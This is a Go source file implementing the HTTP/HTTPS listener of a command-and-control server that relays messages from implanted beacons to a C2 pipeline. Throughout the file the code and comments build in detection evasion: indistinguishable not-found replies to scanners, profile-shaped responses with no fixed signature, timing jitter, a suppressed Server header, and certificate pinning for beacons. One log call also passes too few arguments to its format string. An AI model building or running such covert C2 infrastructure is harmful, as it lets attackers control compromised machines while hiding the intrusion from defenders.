// Package main implements the malleable HTTP/HTTPS listener.
//
// The listener is a transport in front of the same C2 pipeline the DNS server
// drives: every request carries one protocol message, which is handed to
// C2Manager.ProcessHTTPMessage. It exists so a beacon can operate over HTTP,
// HTTPS, or both alongside DNS.
//
// Deliberate design choices, each of which keeps the listener from becoming an
// obvious indicator:
//
//   - Anything that is not a valid, authenticated request for a configured URI
//     gets the profile's not-found status with an empty body. A scanner cannot
//     tell "wrong path" from "wrong signature" from "not a beacon".
//   - Responses are shaped by the profile, including status codes and body
//     codec, so no response is a fixed signature.
//   - Per-request jitter is available to break timing correlation.
//   - Non-matching requests never reach the C2 pipeline, so probing the listener
//     cannot create beacon state, tasks or logs that reveal its purpose.
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// HTTPListener serves one profile's URIs.
type HTTPListener struct {
	// profileName keys the store so hot-reloaded URIs take effect on the next
	// request without restarting the listener.
	profileName string
	store       *HTTPProfileStore
	c2          *C2Manager
	server      *http.Server
	listener    net.Listener
	limiter     *httpRateLimiter
	debug       bool

	mu     sync.RWMutex
	addr   string
	closed bool
}

// NewHTTPListener validates a profile and prepares its listener. It does not
// bind; call Start for that. TLS material is checked here so a misconfigured
// HTTPS profile fails at construction rather than at first beacon contact.
func NewHTTPListener(profile *HTTPProfile, store *HTTPProfileStore, c2 *C2Manager, debug bool) (*HTTPListener, error) {
	if profile == nil {
		return nil, fmt.Errorf("profile is required")
	}
	if err := profile.Validate(); err != nil {
		return nil, fmt.Errorf("invalid profile %q: %w", profile.Name, err)
	}
	if c2 == nil {
		return nil, fmt.Errorf("C2 manager is required")
	}

	if profile.Scheme == "https" {
		if err := verifyListenerCertificate(profile); err != nil {
			return nil, err
		}
	}

	return &HTTPListener{
		profileName: profile.Name,
		store:       store,
		c2:          c2,
		debug:       debug,
		limiter:     newHTTPRateLimiter(),
	}, nil
}

// verifyListenerCertificate loads the profile's certificate and confirms it
// matches the pinned SPKI. Serving a certificate the beacons do not pin would
// look healthy while every beacon failed pinning, so this is a boot error.
func verifyListenerCertificate(profile *HTTPProfile) error {
	cert, err := tls.LoadX509KeyPair(profile.TLS.CertFile, profile.TLS.KeyFile)
	if err != nil {
		return fmt.Errorf("failed to load TLS material for profile %q: %w", profile.Name, err)
	}
	if len(cert.Certificate) == 0 {
		return fmt.Errorf("certificate for profile %q contains no certificates", profile.Name)
	}

	parsed, err := x509.ParseCertificate(cert.Certificate[0])
	if err != nil {
		return fmt.Errorf("failed to parse certificate for profile %q: %w", profile.Name, err)
	}

	if profile.TLS.SPKISHA256 == "" {
		// Not fatal, but beacons cannot pin an absent value, so say so loudly.
		logf("[HTTP] Profile %q has no pinned SPKI; beacons cannot verify this listener", profile.Name)
		return nil
	}

	actual := SPKISHA256(parsed)
	if actual != profile.TLS.SPKISHA256 {
		return fmt.Errorf("profile %q pins SPKI %s but %s serves %s: beacons would reject this listener",
			profile.Name, profile.TLS.SPKISHA256, profile.TLS.CertFile, actual)
	}
	return nil
}

// currentProfile returns the live profile, preferring a hot-reloaded version.
func (l *HTTPListener) currentProfile() *HTTPProfile {
	if l.store != nil {
		if p, ok := l.store.Get(l.profileName); ok {
			return p
		}
	}
	return nil
}

// Addr returns the bound address. Useful in tests and startup logging.
func (l *HTTPListener) Addr() string {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.addr
}

// Start binds and serves. It returns once the listener is bound, so a caller can
// log the real address (including the port chosen when bind_port was 0).
func (l *HTTPListener) Start() error {
	profile := l.currentProfile()
	if profile == nil {
		return fmt.Errorf("profile %q is not in the store", l.profileName)
	}

	addr := profile.ListenerAddr()
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind HTTP listener %q on %s: %w", profile.Name, addr, err)
	}

	muxHandler := http.HandlerFunc(l.ServeHTTP)
	l.server = &http.Server{
		Handler:           muxHandler,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       60 * time.Second,
		// A listener advertising a CDN-ish profile should not volunteer a
		// Server header, and must not leak the Go version.
		ErrorLog: nil,
	}

	if profile.Scheme == "https" {
		tlsConfig, err := l.tlsConfig(profile)
		if err != nil {
			listener.Close()
			return err
		}
		listener = tls.NewListener(listener, tlsConfig)
	}

	l.mu.Lock()
	l.listener = listener
	l.addr = listener.Addr().String()
	l.closed = false
	l.mu.Unlock()

	logf("[HTTP] Listening on %s (%s, profile %q)", l.addr, strings.ToUpper(profile.Scheme), profile.Name)

	go func() {
		if err := l.server.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
			logf("[HTTP] Listener %q stopped: %v", l.profileName, err)
		}
	}()

	return nil
}

// tlsConfig builds the TLS configuration for an HTTPS profile.
func (l *HTTPListener) tlsConfig(profile *HTTPProfile) (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(profile.TLS.CertFile, profile.TLS.KeyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load TLS material: %w", err)
	}

	minVersion := uint16(tls.VersionTLS12)
	if profile.TLS.MinVersion == "1.3" {
		minVersion = tls.VersionTLS13
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   minVersion,
	}, nil
}

// Stop shuts the listener down and waits for in-flight requests.
//
// The socket is closed explicitly as well as through Shutdown: Serve registers
// the listener with the server only once its goroutine starts, so a Stop that
// runs before that would otherwise leave the port bound with nothing serving it,
// and a restart would fail on an address nobody is listening on.
func (l *HTTPListener) Stop(ctx context.Context) error {
	l.mu.Lock()
	if l.closed {
		l.mu.Unlock()
		return nil
	}
	l.closed = true
	server := l.server
	listener := l.listener
	l.mu.Unlock()

	if server != nil {
		if ctx == nil {
			var cancel context.CancelFunc
			ctx, cancel = context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
		}
		err := server.Shutdown(ctx)
		if listener != nil {
			listener.Close()
		}
		return err
	}

	if listener != nil {
		return listener.Close()
	}
	return nil
}

// ServeHTTP is the single entry point for every request.
func (l *HTTPListener) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	profile := l.currentProfile()
	if profile == nil {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	clientIP := remoteIP(r)

	// Rate limit before any parsing so a flood costs as little as possible.
	if !l.limiter.allow(clientIP) {
		if l.debug {
			logf("[HTTP] Rate limited %s on %s", clientIP, r.URL.Path)
		}
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}

	operation := profile.OperationForPath(r.Method, r.URL.Path)
	if operation == "" {
		l.reject(w, profile, "unmatched request %s %s from %s", clientIP)
		return
	}

	body, err := l.readBody(profile, r)
	if err != nil {
		l.reject(w, profile, "body read failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
		return
	}

	key := l.c2.GetEncryptionKey()

	if err := verifyHTTPRequest(profile, key, r, body); err != nil {
		l.reject(w, profile, "auth failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
		return
	}

	message, err := l.extractMessage(profile, r, body)
	if err != nil {
		l.reject(w, profile, "undecodable body for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
		return
	}

	if l.debug {
		logf("[HTTP] %s %s (%s) from %s", r.Method, r.URL.Path, operation, clientIP)
	}

	response, _, _ := l.c2.ProcessHTTPMessage(message, clientIP, profile.requestIsEncrypted())

	l.applyJitter(profile)

	if strings.TrimSpace(response) == "" {
		// Nothing to say: the message was not recognised as C2 traffic. Answer
		// with the profile's empty status rather than a distinguishable error.
		w.WriteHeader(profile.Status.Empty)
		return
	}

	encoded, err := encodeHTTPBody(profile.ResponseBody, response, key)
	if err != nil {
		logf("[HTTP] Failed to encode response: %v", err)
		w.WriteHeader(profile.Status.Error)
		return
	}

	w.Header().Set("Content-Type", responseContentType(profile.ResponseBody))
	w.WriteHeader(profile.Status.OK)
	w.Write(encoded)
}

// readBody reads at most the profile's limit so a large body cannot exhaust
// memory, and so the limit itself is a profile property rather than a constant.
func (l *HTTPListener) readBody(profile *HTTPProfile, r *http.Request) ([]byte, error) {
	if r.Body == nil {
		return nil, nil
	}
	limited := io.LimitReader(r.Body, profile.MaxBodyBytes+1)
	body, err := io.ReadAll(limited)
	if err != nil {
		return nil, err
	}
	if int64(len(body)) > profile.MaxBodyBytes {
		return nil, fmt.Errorf("body exceeds %d bytes", profile.MaxBodyBytes)
	}
	return body, nil
}

// extractMessage obtains the encoded protocol message.
//
// POST-style operations carry it in the body. GET-style operations (the default
// task and ack shapes) carry it in the query parameter named by the request
// codec's Field, so a profile that names the field "d" produces ?d=<payload>.
func (l *HTTPListener) extractMessage(profile *HTTPProfile, r *http.Request, body []byte) (string, error) {
	key := l.c2.GetEncryptionKey()

	if len(body) > 0 {
		return decodeHTTPBody(profile.RequestBody, body, key)
	}

	value := r.URL.Query().Get(profile.RequestBody.Field)
	if value == "" {
		return "", fmt.Errorf("no body and no %q query parameter", profile.RequestBody.Field)
	}

	// Reuse the decode path by presenting the value as a JSON object, so the
	// codec logic exists in exactly one place.
	if profile.RequestBody.Encoding == codecRaw {
		return value, nil
	}
	synthetic := []byte(fmt.Sprintf(`{"%s":%q}`, profile.RequestBody.Field, value))
	return decodeHTTPBody(profile.RequestBody, synthetic, key)
}

// applyJitter sleeps for a profile-configured random interval.
func (l *HTTPListener) applyJitter(profile *HTTPProfile) {
	if profile.Jitter.MaxMs <= 0 {
		return
	}
	minimum := profile.Jitter.MinMs
	if minimum < 0 {
		minimum = 0
	}
	if profile.Jitter.MaxMs <= minimum {
		time.Sleep(time.Duration(minimum) * time.Millisecond)
		return
	}
	time.Sleep(time.Duration(minimum+rand.Intn(profile.Jitter.MaxMs-minimum+1)) * time.Millisecond)
}

// reject logs at most once per request and answers with the not-found status.
func (l *HTTPListener) reject(w http.ResponseWriter, profile *HTTPProfile, format string, args ...interface{}) {
	if l.debug {
		logf("[HTTP] "+format, args...)
	}
	w.WriteHeader(profile.Status.NotFound)
}

// requestIsEncrypted reports whether the profile describes an encrypted beacon
// build. A base36/base64/raw profile means the beacon is unencrypted, and the
// pipeline must be told so it answers without AES, exactly as the DNS path does.
func (p *HTTPProfile) requestIsEncrypted() bool {
	switch p.RequestBody.Encoding {
	case codecAESGCMBase36, codecAESGCMBase64:
		return true
	}
	return false
}

// responseContentType picks a content type consistent with the body codec.
func responseContentType(c BodyCodec) string {
	if c.Encoding == codecRaw {
		return "text/plain; charset=utf-8"
	}
	return "application/json"
}

// remoteIP extracts the client address without trusting forwarding headers.
// X-Forwarded-For is ignored on purpose: honouring it would let any client
// choose its own rate-limit bucket.
func remoteIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}
